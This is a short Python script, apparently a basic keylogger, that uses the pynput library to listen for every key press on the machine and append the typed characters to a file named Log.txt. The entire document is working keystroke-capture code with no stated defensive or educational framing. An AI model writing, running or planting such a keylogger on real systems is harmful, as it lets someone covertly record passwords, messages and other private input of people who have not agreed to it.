from pynput import keyboard


def pressed(key):
    print(str(key))
    with open("Log.txt", 'a') as logkey:
        try:
            logkey.write(key.char)
        except:
            print("Error appending Character")
            

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=pressed)
    listener.start()
    input()
